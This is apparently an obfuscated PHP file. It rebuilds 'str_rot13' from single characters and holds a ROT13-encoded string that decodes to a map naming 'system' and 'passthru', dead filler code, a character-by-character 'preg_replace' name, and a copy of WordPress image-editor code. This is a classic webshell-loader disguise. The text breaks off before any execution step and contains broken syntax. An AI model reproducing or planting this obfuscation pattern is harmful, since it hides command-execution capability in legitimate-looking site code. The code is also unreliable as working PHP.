<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff Vzntr Rqvgbe
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Ybnqf gur JC vzntr-rqvgvat vagresnpr.
 *
 * @fvapr 2.9.0
 *
 * @cnenz vag          $cbfg_vq Nggnpuzrag cbfg VQ.
 * @cnenz snyfr|bowrpg $zft     Bcgvbany. Zrffntr gb qvfcynl sbe vzntr rqvgbe hcqngrf be reebef.
 *                              Qrsnhyg snyfr.
 */
shapgvba jc_vzntr_rqvgbe( $cbfg_vq, $zft = snyfr ) {
	$abapr     = jc_perngr_abapr( \"vzntr_rqvgbe-$cbfg_vq\" );
	$zrgn      = jc_trg_nggnpuzrag_zrgnqngn( $cbfg_vq );
	$guhzo     = vzntr_trg_vagrezrqvngr_fvmr( $cbfg_vq, 'guhzoanvy' );
	$fho_fvmrf = vffrg( $zrgn['fvmrf'] ) && vf_neenl( $zrgn['fvmrf'] );
	$abgr      = '';

	vs ( vffrg( $zrgn['jvqgu'], $zrgn['urvtug'] ) ) {
		$ovt = znk( $zrgn['jvqgu'], $zrgn['urvtug'] );
	} ryfr {
		qvr( __( 'Vzntr qngn qbrf abg rkvfg. Cyrnfr er-hcybnq gur vzntr.' ) );
	}

	$fvmre = $ovt > 600 ? 600 / $ovt : 1;

	$onpxhc_fvmrf = trg_cbfg_zrgn( $cbfg_vq, '_jc_nggnpuzrag_onpxhc_fvmrf', gehr );
	$pna_erfgber  = snyfr;

	vs ( ! rzcgl( $onpxhc_fvmrf ) && vffrg( $onpxhc_fvmrf['shyy-bevt'], $zrgn['svyr'] ) ) {
		$pna_erfgber = jc_onfranzr( $zrgn['svyr'] ) !== $onpxhc_fvmrf['shyy-bevt']['svyr'];
	}

	vs ( $zft ) {
		vs ( vffrg( $zft->reebe ) ) {
			$abgr = \"<qvi pynff='abgvpr abgvpr-reebe' ebyr='nyreg'><c>$zft->reebe</c></qvi>\";
		} ryfrvs ( vffrg( $zft->zft ) ) {
			$abgr = \"<qvi pynff='abgvpr abgvpr-fhpprff' ebyr='nyreg'><c>$zft->zft</c></qvi>\";
		}
	}

	/**
	 * Fubjf gur frggvatf va gur Vzntr Rqvgbe gung nyybj fryrpgvat gb rqvg bayl gur guhzoanvy bs na vzntr.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz obby $fubj Jurgure gb fubj gur frggvatf va gur Vzntr Rqvgbe. Qrsnhyg snyfr.
	 */
	$rqvg_guhzoanvyf_frcnengryl = (obby) nccyl_svygref( 'vzntr_rqvg_guhzoanvyf_frcnengryl', snyfr );

	?>
	<qvi pynff=\"vztrqvg-jenc jc-pyrnesvk\">
	<qvi vq=\"vztrqvg-cnary-<?cuc rpub $cbfg_vq; ?>\">
	<?cuc rpub $abgr; ?>
	<qvi pynff=\"vztrqvg-cnary-pbagrag vztrqvg-cnary-gbbyf jc-pyrnesvk\">
		<qvi pynff=\"vztrqvg-zrah jc-pyrnesvk\">
			<ohggba glcr=\"ohggba\" bapyvpx=\"vzntrRqvg.gbttyrPebcGbby( <?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, guvf );\" nevn-rkcnaqrq=\"snyfr\" nevn-pbagebyf=\"vztrqvg-pebc\" pynff=\"vztrqvg-pebc ohggba qvfnoyrq\" qvfnoyrq><?cuc rfp_ugzy_r( 'Pebc' ); ?></ohggba>
			<ohggba glcr=\"ohggba\" pynff=\"vztrqvg-fpnyr ohggba\" bapyvpx=\"vzntrRqvg.gbttyrPbagebyf(guvf);\" nevn-rkcnaqrq=\"snyfr\" nevn-pbagebyf=\"vztrqvg-fpnyr\"><?cuc rfp_ugzy_r( 'Fpnyr' ); ?></ohggba>
			<qvi pynff=\"vztrqvg-ebgngr-zrah-pbagnvare\">
				<ohggba glcr=\"ohggba\" nevn-pbagebyf=\"vztrqvg-ebgngr-zrah\" pynff=\"vztrqvg-ebgngr ohggba\" nevn-rkcnaqrq=\"snyfr\" bapyvpx=\"vzntrRqvg.gbttyrCbchc(guvf)\" baoyhe=\"vzntrRqvg.zbavgbeCbchc()\"><?cuc rfp_ugzy_r( 'Vzntr Ebgngvba' ); ?></ohggba>
				<qvi vq=\"vztrqvg-ebgngr-zrah\" pynff=\"vztrqvg-cbchc-zrah\">
			<?cuc
			// Ba fbzr frghcf TQ yvoenel qbrf abg cebivqr vzntrebgngr() - Gvpxrg #11536.
			vs ( jc_vzntr_rqvgbe_fhccbegf(
				neenl(
					'zvzr_glcr' => trg_cbfg_zvzr_glcr( $cbfg_vq ),
					'zrgubqf'   => neenl( 'ebgngr' ),
				)
			) ) {
				$abgr_ab_ebgngr = '';
				?>
					<ohggba glcr=\"ohggba\" pynff=\"vztrqvg-eyrsg ohggba\" baxrlqbja=\"vzntrRqvg.oebjfrCbchc(rirag, guvf)\" bapyvpx=\"vzntrRqvg.ebgngr( 90, <?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, guvf)\" baoyhe=\"vzntrRqvg.zbavgbeCbchc()\"><?cuc rfp_ugzy_r( 'Ebgngr 90&qrt; yrsg' ); ?></ohggba>
					<ohggba glcr=\"ohggba\" pynff=\"vztrqvg-eevtug ohggba\" baxrlqbja=\"vzntrRqvg.oebjfrCbchc(rirag, guvf)\" bapyvpx=\"vzntrRqvg.ebgngr(-90, <?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, guvf)\" baoyhe=\"vzntrRqvg.zbavgbeCbchc()\"><?cuc rfp_ugzy_r( 'Ebgngr 90&qrt; evtug' ); ?></ohggba>
					<ohggba glcr=\"ohggba\" pynff=\"vztrqvg-eshyy ohggba\" baxrlqbja=\"vzntrRqvg.oebjfrCbchc(rirag, guvf)\" bapyvpx=\"vzntrRqvg.ebgngr(180, <?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, guvf)\" baoyhe=\"vzntrRqvg.zbavgbeCbchc()\"><?cuc rfp_ugzy_r( 'Ebgngr 180&qrt;' ); ?></ohggba>
				<?cuc
			} ryfr {
				$abgr_ab_ebgngr = '<c pynff=\"abgr-ab-ebgngr\"><rz>' . __( 'Vzntr ebgngvba vf abg fhccbegrq ol lbhe jro ubfg.' ) . '</rz></c>';
				?>
					<ohggba glcr=\"ohggba\" pynff=\"vztrqvg-eyrsg ohggba qvfnoyrq\" qvfnoyrq></ohggba>
					<ohggba glcr=\"ohggba\" pynff=\"vztrqvg-eevtug ohggba qvfnoyrq\" qvfnoyrq></ohggba>
				<?cuc
			}
			?>
					<ue />
					<ohggba glcr=\"ohggba\" baxrlqbja=\"vzntrRqvg.oebjfrCbchc(rirag, guvf)\" bapyvpx=\"vzntrRqvg.syvc(1, <?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, guvf)\" baoyhe=\"vzntrRqvg.zbavgbeCbchc()\" pynff=\"vztrqvg-syvci ohggba\"><?cuc rfp_ugzy_r( 'Syvc iregvpny' ); ?></ohggba>
					<ohggba glcr=\"ohggba\" baxrlqbja=\"vzntrRqvg.oebjfrCbchc(rirag, guvf)\" bapyvpx=\"vzntrRqvg.syvc(2, <?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, guvf)\" baoyhe=\"vzntrRqvg.zbavgbeCbchc()\" pynff=\"vztrqvg-syvcu ohggba\"><?cuc rfp_ugzy_r( 'Syvc ubevmbagny' ); ?></ohggba>
					<?cuc rpub $abgr_ab_ebgngr; ?>
				</qvi>
			</qvi>
		</qvi>
		<qvi pynff=\"vztrqvg-fhozvg vztrqvg-zrah\">
			<ohggba glcr=\"ohggba\" vq=\"vzntr-haqb-<?cuc rpub $cbfg_vq; ?>\" bapyvpx=\"vzntrRqvg.haqb(<?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, guvf)\" pynff=\"vztrqvg-haqb ohggba qvfnoyrq\" qvfnoyrq><?cuc rfp_ugzy_r( 'Haqb' ); ?></ohggba>
			<ohggba glcr=\"ohggba\" vq=\"vzntr-erqb-<?cuc rpub $cbfg_vq; ?>\" bapyvpx=\"vzntrRqvg.erqb(<?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, guvf)\" pynff=\"vztrqvg-erqb ohggba qvfnoyrq\" qvfnoyrq><?cuc rfp_ugzy_r( 'Erqb' ); ?></ohggba>
			<ohggba glcr=\"ohggba\" bapyvpx=\"vzntrRqvg.pybfr(<?cuc rpub $cbfg_vq; ?>, 1)\" pynff=\"ohggba vztrqvg-pnapry-oga\"><?cuc rfp_ugzy_r( 'Pnapry Rqvgvat' ); ?></ohggba>
			<ohggba glcr=\"ohggba\" bapyvpx=\"vzntrRqvg.fnir(<?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>)\" qvfnoyrq=\"qvfnoyrq\" pynff=\"ohggba ohggba-cevznel vztrqvg-fhozvg-oga\"><?cuc rfp_ugzy_r( 'Fnir Rqvgf' ); ?></ohggba>
		</qvi>
	</qvi>

	<qvi pynff=\"vztrqvg-cnary-pbagrag jc-pyrnesvk\">
		<qvi pynff=\"vztrqvg-gbbyf\">
			<vachg glcr=\"uvqqra\" vq=\"vztrqvg-abapr-<?cuc rpub $cbfg_vq; ?>\" inyhr=\"<?cuc rpub $abapr; ?>\" />
			<vachg glcr=\"uvqqra\" vq=\"vztrqvg-fvmre-<?cuc rpub $cbfg_vq; ?>\" inyhr=\"<?cuc rpub $fvmre; ?>\" />
			<vachg glcr=\"uvqqra\" vq=\"vztrqvg-uvfgbel-<?cuc rpub $cbfg_vq; ?>\" inyhr=\"\" />
			<vachg glcr=\"uvqqra\" vq=\"vztrqvg-haqbar-<?cuc rpub $cbfg_vq; ?>\" inyhr=\"0\" />
			<vachg glcr=\"uvqqra\" vq=\"vztrqvg-fryrpgvba-<?cuc rpub $cbfg_vq; ?>\" inyhr=\"\" />
			<vachg glcr=\"uvqqra\" vq=\"vztrqvg-k-<?cuc rpub $cbfg_vq; ?>\" inyhr=\"<?cuc rpub vffrg( $zrgn['jvqgu'] ) ? $zrgn['jvqgu'] : 0; ?>\" />
			<vachg glcr=\"uvqqra\" vq=\"vztrqvg-l-<?cuc rpub $cbfg_vq; ?>\" inyhr=\"<?cuc rpub vffrg( $zrgn['urvtug'] ) ? $zrgn['urvtug'] : 0; ?>\" />

			<qvi vq=\"vztrqvg-pebc-<?cuc rpub $cbfg_vq; ?>\" pynff=\"vztrqvg-pebc-jenc\">
			<qvi pynff=\"vztrqvg-pebc-tevq\"></qvi>
			<vzt vq=\"vzntr-cerivrj-<?cuc rpub $cbfg_vq; ?>\" baybnq=\"vzntrRqvg.vztYbnqrq('<?cuc rpub $cbfg_vq; ?>')\"
				fep=\"<?cuc rpub rfp_hey( nqzva_hey( 'nqzva-nwnk.cuc', 'eryngvir' ) ) . '?npgvba=vztrqvg-cerivrj&nzc;_nwnk_abapr=' . $abapr . '&nzc;cbfgvq=' . $cbfg_vq . '&nzc;enaq=' . enaq( 1, 99999 ); ?>\" nyg=\"\" />
			</qvi>
		</qvi>
		<qvi pynff=\"vztrqvg-frggvatf\">
			<qvi pynff=\"vztrqvg-gbby-npgvir\">
				<qvi pynff=\"vztrqvg-tebhc\">
				<qvi vq=\"vztrqvg-fpnyr\" gnovaqrk=\"-1\" pynff=\"vztrqvg-tebhc-pbagebyf\">
					<qvi pynff=\"vztrqvg-tebhc-gbc\">
						<u2><?cuc _r( 'Fpnyr Vzntr' ); ?></u2>
						<ohggba glcr=\"ohggba\" pynff=\"qnfuvpbaf qnfuvpbaf-rqvgbe-uryc vztrqvg-uryc-gbttyr\" bapyvpx=\"vzntrRqvg.gbttyrUryc(guvf);\" nevn-rkcnaqrq=\"snyfr\"><fcna pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						rfp_ugzy_r( 'Fpnyr Vzntr Uryc' );
						?>
						</fcna></ohggba>
						<qvi pynff=\"vztrqvg-uryc\">
						<c><?cuc _r( 'Lbh pna cebcbegvbanyyl fpnyr gur bevtvany vzntr. Sbe orfg erfhygf, fpnyvat fubhyq or qbar orsber lbh pebc, syvc, be ebgngr. Vzntrf pna bayl or fpnyrq qbja, abg hc.' ); ?></c>
						</qvi>
						<?cuc vs ( vffrg( $zrgn['jvqgu'], $zrgn['urvtug'] ) ) : ?>
						<c>
							<?cuc
							cevags(
								/* genafyngbef: %f: Vzntr jvqgu naq urvtug va cvkryf. */
								__( 'Bevtvany qvzrafvbaf %f' ),
								'<fcna pynff=\"vztrqvg-bevtvany-qvzrafvbaf\">' . $zrgn['jvqgu'] . ' &gvzrf; ' . $zrgn['urvtug'] . '</fcna>'
							);
							?>
						</c>
						<?cuc raqvs; ?>
						<qvi pynff=\"vztrqvg-fhozvg\">
						<svryqfrg pynff=\"vztrqvg-fpnyr-pbagebyf\">
							<yrtraq><?cuc _r( 'Arj qvzrafvbaf:' ); ?></yrtraq>
							<qvi pynff=\"abjenc\">
							<ynory sbe=\"vztrqvg-fpnyr-jvqgu-<?cuc rpub $cbfg_vq; ?>\" pynff=\"fperra-ernqre-grkg\">
							<?cuc
							/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
							_r( 'fpnyr urvtug' );
							?>
							</ynory>
							<vachg glcr=\"ahzore\" fgrc=\"1\" zva=\"0\" znk=\"<?cuc rpub vffrg( $zrgn['jvqgu'] ) ? $zrgn['jvqgu'] : ''; ?>\" nevn-qrfpevorqol=\"vztrqvg-fpnyr-jnea-<?cuc rpub $cbfg_vq; ?>\"  vq=\"vztrqvg-fpnyr-jvqgu-<?cuc rpub $cbfg_vq; ?>\" baxrlhc=\"vzntrRqvg.fpnyrPunatrq(<?cuc rpub $cbfg_vq; ?>, 1, guvf)\" baoyhe=\"vzntrRqvg.fpnyrPunatrq(<?cuc rpub $cbfg_vq; ?>, 1, guvf)\" inyhr=\"<?cuc rpub vffrg( $zrgn['jvqgu'] ) ? $zrgn['jvqgu'] : 0; ?>\" />
							<fcna pynff=\"vztrqvg-frcnengbe\" nevn-uvqqra=\"gehr\">&gvzrf;</fcna>
							<ynory sbe=\"vztrqvg-fpnyr-urvtug-<?cuc rpub $cbfg_vq; ?>\" pynff=\"fperra-ernqre-grkg\"><?cuc _r( 'fpnyr urvtug' ); ?></ynory>
							<vachg glcr=\"ahzore\" fgrc=\"1\" zva=\"0\" znk=\"<?cuc rpub vffrg( $zrgn['urvtug'] ) ? $zrgn['urvtug'] : ''; ?>\" nevn-qrfpevorqol=\"vztrqvg-fpnyr-jnea-<?cuc rpub $cbfg_vq; ?>\" vq=\"vztrqvg-fpnyr-urvtug-<?cuc rpub $cbfg_vq; ?>\" baxrlhc=\"vzntrRqvg.fpnyrPunatrq(<?cuc rpub $cbfg_vq; ?>, 0, guvf)\" baoyhe=\"vzntrRqvg.fpnyrPunatrq(<?cuc rpub $cbfg_vq; ?>, 0, guvf)\" inyhr=\"<?cuc rpub vffrg( $zrgn['urvtug'] ) ? $zrgn['urvtug'] : 0; ?>\" />
							<ohggba vq=\"vztrqvg-fpnyr-ohggba\" glcr=\"ohggba\" bapyvpx=\"vzntrRqvg.npgvba(<?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, 'fpnyr')\" pynff=\"ohggba ohggba-cevznel\"><?cuc rfp_ugzy_r( 'Fpnyr' ); ?></ohggba>
							</qvi>
							<fcna pynff=\"vztrqvg-fpnyr-jnea\" vq=\"vztrqvg-fpnyr-jnea-<?cuc rpub $cbfg_vq; ?>\"><fcna pynff=\"qnfuvpbaf qnfuvpbaf-jneavat\" nevn-uvqqra=\"gehr\"></fcna><?cuc rfp_ugzy_r( 'Vzntrf pnaabg or fpnyrq gb n fvmr ynetre guna gur bevtvany.' ); ?></fcna>
						</svryqfrg>
						</qvi>
					</qvi>
				</qvi>
			</qvi>

		<?cuc vs ( $pna_erfgber ) { ?>
				<qvi pynff=\"vztrqvg-tebhc\">
				<qvi pynff=\"vztrqvg-tebhc-gbc\">
					<u2><ohggba glcr=\"ohggba\" bapyvpx=\"vzntrRqvg.gbttyrUryc(guvf);\" pynff=\"ohggba-yvax\" nevn-rkcnaqrq=\"snyfr\"><?cuc _r( 'Erfgber bevtvany vzntr' ); ?> <fcna pynff=\"qnfuvpbaf qnfuvpbaf-neebj-qbja vztrqvg-uryc-gbttyr\"></fcna></ohggba></u2>
					<qvi pynff=\"vztrqvg-uryc vztrqvg-erfgber\">
					<c>
					<?cuc
					_r( 'Qvfpneq nal punatrf naq erfgber gur bevtvany vzntr.' );
					vs ( ! qrsvarq( 'VZNTR_RQVG_BIREJEVGR' ) || ! VZNTR_RQVG_BIREJEVGR ) {
						rpub ' ' . __( 'Cerivbhfyl rqvgrq pbcvrf bs gur vzntr jvyy abg or qryrgrq.' );
					}
					?>
					</c>
					<qvi pynff=\"vztrqvg-fhozvg\">
						<vachg glcr=\"ohggba\" bapyvpx=\"vzntrRqvg.npgvba(<?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, 'erfgber')\" pynff=\"ohggba ohggba-cevznel\" inyhr=\"<?cuc rfp_ngge_r( 'Erfgber vzntr' ); ?>\" <?cuc rpub $pna_erfgber; ?> />
					</qvi>
				</qvi>
			</qvi>
			</qvi>
		<?cuc } ?>
			<qvi pynff=\"vztrqvg-tebhc\">
				<qvi vq=\"vztrqvg-pebc\" gnovaqrk=\"-1\" pynff=\"vztrqvg-tebhc-pbagebyf\">
				<qvi pynff=\"vztrqvg-tebhc-gbc\">
					<u2><?cuc _r( 'Pebc Vzntr' ); ?></u2>
					<ohggba glcr=\"ohggba\" pynff=\"qnfuvpbaf qnfuvpbaf-rqvgbe-uryc vztrqvg-uryc-gbttyr\" bapyvpx=\"vzntrRqvg.gbttyrUryc(guvf);\" nevn-rkcnaqrq=\"snyfr\"><fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Vzntr Pebc Uryc' );
					?>
					</fcna></ohggba>
					<qvi pynff=\"vztrqvg-uryc\">
						<c><?cuc _r( 'Gb pebc gur vzntr, pyvpx ba vg naq qent gb znxr lbhe fryrpgvba.' ); ?></c>
						<c><fgebat><?cuc _r( 'Pebc Nfcrpg Engvb' ); ?></fgebat><oe />
						<?cuc _r( 'Gur nfcrpg engvb vf gur eryngvbafuvc orgjrra gur jvqgu naq urvtug. Lbh pna cerfreir gur nfcrpg engvb ol ubyqvat qbja gur fuvsg xrl juvyr erfvmvat lbhe fryrpgvba. Hfr gur vachg obk gb fcrpvsl gur nfcrpg engvb, r.t. 1:1 (fdhner), 4:3, 16:9, rgp.' ); ?></c>

						<c><fgebat><?cuc _r( 'Pebc Fryrpgvba' ); ?></fgebat><oe />
						<?cuc _r( 'Bapr lbh unir znqr lbhe fryrpgvba, lbh pna nqwhfg vg ol ragrevat gur fvmr va cvkryf. Gur zvavzhz fryrpgvba fvmr vf gur guhzoanvy fvmr nf frg va gur Zrqvn frggvatf.' ); ?></c>
					</qvi>
				</qvi>
				<svryqfrg pynff=\"vztrqvg-pebc-engvb\">
					<yrtraq><?cuc _r( 'Nfcrpg engvb:' ); ?></yrtraq>
					<qvi pynff=\"abjenc\">
					<ynory sbe=\"vztrqvg-pebc-jvqgu-<?cuc rpub $cbfg_vq; ?>\" pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'pebc engvb jvqgu' );
					?>
					</ynory>
					<vachg glcr=\"ahzore\" fgrc=\"1\" zva=\"1\" vq=\"vztrqvg-pebc-jvqgu-<?cuc rpub $cbfg_vq; ?>\" baxrlhc=\"vzntrRqvg.frgEngvbFryrpgvba(<?cuc rpub $cbfg_vq; ?>, 0, guvf)\" baoyhe=\"vzntrRqvg.frgEngvbFryrpgvba(<?cuc rpub $cbfg_vq; ?>, 0, guvf)\" />
					<fcna pynff=\"vztrqvg-frcnengbe\" nevn-uvqqra=\"gehr\">:</fcna>
					<ynory sbe=\"vztrqvg-pebc-urvtug-<?cuc rpub $cbfg_vq; ?>\" pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'pebc engvb urvtug' );
					?>
					</ynory>
					<vachg  glcr=\"ahzore\" fgrc=\"1\" zva=\"0\" vq=\"vztrqvg-pebc-urvtug-<?cuc rpub $cbfg_vq; ?>\" baxrlhc=\"vzntrRqvg.frgEngvbFryrpgvba(<?cuc rpub $cbfg_vq; ?>, 1, guvf)\" baoyhe=\"vzntrRqvg.frgEngvbFryrpgvba(<?cuc rpub $cbfg_vq; ?>, 1, guvf)\" />
					</qvi>
				</svryqfrg>
				<svryqfrg vq=\"vztrqvg-pebc-fry-<?cuc rpub $cbfg_vq; ?>\" pynff=\"vztrqvg-pebc-fry\">
					<yrtraq><?cuc _r( 'Fryrpgvba:' ); ?></yrtraq>
					<qvi pynff=\"abjenc\">
					<ynory sbe=\"vztrqvg-fry-jvqgu-<?cuc rpub $cbfg_vq; ?>\" pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'fryrpgvba jvqgu' );
					?>
					</ynory>
					<vachg  glcr=\"ahzore\" fgrc=\"1\" zva=\"0\" vq=\"vztrqvg-fry-jvqgu-<?cuc rpub $cbfg_vq; ?>\" baxrlhc=\"vzntrRqvg.frgAhzFryrpgvba(<?cuc rpub $cbfg_vq; ?>, guvf)\" baoyhe=\"vzntrRqvg.frgAhzFryrpgvba(<?cuc rpub $cbfg_vq; ?>, guvf)\" />
					<fcna pynff=\"vztrqvg-frcnengbe\" nevn-uvqqra=\"gehr\">&gvzrf;</fcna>
					<ynory sbe=\"vztrqvg-fry-urvtug-<?cuc rpub $cbfg_vq; ?>\" pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'fryrpgvba urvtug' );
					?>
					</ynory>
					<vachg  glcr=\"ahzore\" fgrc=\"1\" zva=\"0\" vq=\"vztrqvg-fry-urvtug-<?cuc rpub $cbfg_vq; ?>\" baxrlhc=\"vzntrRqvg.frgAhzFryrpgvba(<?cuc rpub $cbfg_vq; ?>, guvf)\" baoyhe=\"vzntrRqvg.frgAhzFryrpgvba(<?cuc rpub $cbfg_vq; ?>, guvf)\" />
					</qvi>
				</svryqfrg>
				<svryqfrg vq=\"vztrqvg-pebc-fry-<?cuc rpub $cbfg_vq; ?>\" pynff=\"vztrqvg-pebc-fry\">
					<yrtraq><?cuc _r( 'Fgnegvat Pbbeqvangrf:' ); ?></yrtraq>
					<qvi pynff=\"abjenc\">
					<ynory sbe=\"vztrqvg-fgneg-k-<?cuc rpub $cbfg_vq; ?>\" pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'ubevmbagny fgneg cbfvgvba' );
					?>
					</ynory>
					<vachg  glcr=\"ahzore\" fgrc=\"1\" zva=\"0\" vq=\"vztrqvg-fgneg-k-<?cuc rpub $cbfg_vq; ?>\" baxrlhc=\"vzntrRqvg.frgAhzFryrpgvba(<?cuc rpub $cbfg_vq; ?>, guvf)\" baoyhe=\"vzntrRqvg.frgAhzFryrpgvba(<?cuc rpub $cbfg_vq; ?>, guvf)\" inyhr=\"0\" />
					<fcna pynff=\"vztrqvg-frcnengbe\" nevn-uvqqra=\"gehr\">&gvzrf;</fcna>
					<ynory sbe=\"vztrqvg-fgneg-l-<?cuc rpub $cbfg_vq; ?>\" pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'iregvpny fgneg cbfvgvba' );
					?>
					</ynory>
					<vachg  glcr=\"ahzore\" fgrc=\"1\" zva=\"0\" vq=\"vztrqvg-fgneg-l-<?cuc rpub $cbfg_vq; ?>\" baxrlhc=\"vzntrRqvg.frgAhzFryrpgvba(<?cuc rpub $cbfg_vq; ?>, guvf)\" baoyhe=\"vzntrRqvg.frgAhzFryrpgvba(<?cuc rpub $cbfg_vq; ?>, guvf)\" inyhr=\"0\" />
					</qvi>
				</svryqfrg>
				<qvi pynff=\"vztrqvg-pebc-nccyl vztrqvg-zrah pbagnvare\">
					<ohggba pynff=\"ohggba-cevznel\" glcr=\"ohggba\" bapyvpx=\"vzntrRqvg.unaqyrPebcGbbyPyvpx( <?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, guvf );\" pynff=\"vztrqvg-pebc-nccyl ohggba\"><?cuc rfp_ugzy_r( 'Nccyl Pebc' ); ?></ohggba> <ohggba glcr=\"ohggba\" bapyvpx=\"vzntrRqvg.unaqyrPebcGbbyPyvpx( <?cuc rpub \"$cbfg_vq, '$abapr'\"; ?>, guvf );\" pynff=\"vztrqvg-pebc-pyrne ohggba\" qvfnoyrq=\"qvfnoyrq\"><?cuc rfp_ugzy_r( 'Pyrne Pebc' ); ?></ohggba>
				</qvi>
			</qvi>
		</qvi>
	</qvi>

	<?cuc
	vs ( $rqvg_guhzoanvyf_frcnengryl && $guhzo && $fho_fvmrf ) {
		$guhzo_vzt = jc_pbafgenva_qvzrafvbaf( $guhzo['jvqgu'], $guhzo['urvtug'], 160, 120 );
		?>

	<qvi pynff=\"vztrqvg-tebhc vztrqvg-nccylgb\">
		<qvi pynff=\"vztrqvg-tebhc-gbc\">
			<u2><?cuc _r( 'Guhzoanvy Frggvatf' ); ?></u2>
			<ohggba glcr=\"ohggba\" pynff=\"qnfuvpbaf qnfuvpbaf-rqvgbe-uryc vztrqvg-uryc-gbttyr\" bapyvpx=\"vzntrRqvg.gbttyrUryc(guvf);\" nevn-rkcnaqrq=\"snyfr\"><fcna pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			rfp_ugzy_r( 'Guhzoanvy Frggvatf Uryc' );
			?>
			</fcna></ohggba>
			<qvi pynff=\"vztrqvg-uryc\">
			<c><?cuc _r( 'Lbh pna rqvg gur vzntr juvyr cerfreivat gur guhzoanvy. Sbe rknzcyr, lbh znl jvfu gb unir n fdhner guhzoanvy gung qvfcynlf whfg n frpgvba bs gur vzntr.' ); ?></c>
			</qvi>
		</qvi>
		<qvi pynff=\"vztrqvg-guhzoanvy-cerivrj-tebhc\">
			<svther pynff=\"vztrqvg-guhzoanvy-cerivrj\">
				<vzt fep=\"<?cuc rpub rfp_hey( $guhzo['hey'] ); ?>\" jvqgu=\"<?cuc rpub rfp_ngge( $guhzo_vzt[0] ); ?>\" urvtug=\"<?cuc rpub rfp_ngge( $guhzo_vzt[1] ); ?>\" pynff=\"vztrqvg-fvmr-cerivrj\" nyg=\"\" qenttnoyr=\"snyfr\" />
				<svtpncgvba pynff=\"vztrqvg-guhzoanvy-cerivrj-pncgvba\"><?cuc _r( 'Pheerag guhzoanvy' ); ?></svtpncgvba>
			</svther>
			<qvi vq=\"vztrqvg-fnir-gnetrg-<?cuc rpub $cbfg_vq; ?>\" pynff=\"vztrqvg-fnir-gnetrg\">
			<svryqfrg>
				<yrtraq><?cuc _r( 'Nccyl punatrf gb:' ); ?></yrtraq>

				<fcna pynff=\"vztrqvg-ynory\">
					<vachg glcr=\"enqvb\" vq=\"vztrqvg-gnetrg-nyy\" anzr=\"vztrqvg-gnetrg-<?cuc rpub $cbfg_vq; ?>\" inyhr=\"nyy\" purpxrq=\"purpxrq\" />
					<ynory sbe=\"vztrqvg-gnetrg-nyy\"><?cuc _r( 'Nyy vzntr fvmrf' ); ?></ynory>
				</fcna>

				<fcna pynff=\"vztrqvg-ynory\">
					<vachg glcr=\"enqvb\" vq=\"vztrqvg-gnetrg-guhzoanvy\" anzr=\"vztrqvg-gnetrg-<?cuc rpub $cbfg_vq; ?>\" inyhr=\"guhzoanvy\" />
					<ynory sbe=\"vztrqvg-gnetrg-guhzoanvy\"><?cuc _r( 'Guhzoanvy' ); ?></ynory>
				</fcna>

				<fcna pynff=\"vztrqvg-ynory\">
					<vachg glcr=\"enqvb\" vq=\"vztrqvg-gnetrg-abguhzo\" anzr=\"vztrqvg-gnetrg-<?cuc rpub $cbfg_vq; ?>\" inyhr=\"abguhzo\" />
					<ynory sbe=\"vztrqvg-gnetrg-abguhzo\"><?cuc _r( 'Nyy fvmrf rkprcg guhzoanvy' ); ?></ynory>
				</fcna>

				</svryqfrg>
			</qvi>
		</qvi>
	</qvi>
	<?cuc } ?>
		</qvi>
	</qvi>

	</qvi>

	<qvi pynff=\"vztrqvg-jnvg\" vq=\"vztrqvg-jnvg-<?cuc rpub $cbfg_vq; ?>\"></qvi>
	<qvi pynff=\"uvqqra\" vq=\"vztrqvg-yrnivat-<?cuc rpub $cbfg_vq; ?>\"><?cuc _r( \"Gurer ner hafnirq punatrf gung jvyy or ybfg. 'BX' gb pbagvahr, 'Pnapry' gb erghea gb gur Vzntr Rqvgbe.\" ); ?></qvi>
	</qvi>
	<?cuc
}

/**
 * Fgernzf vzntr va JC_Vzntr_Rqvgbe gb oebjfre.
 *
 * @fvapr 2.9.0
 *
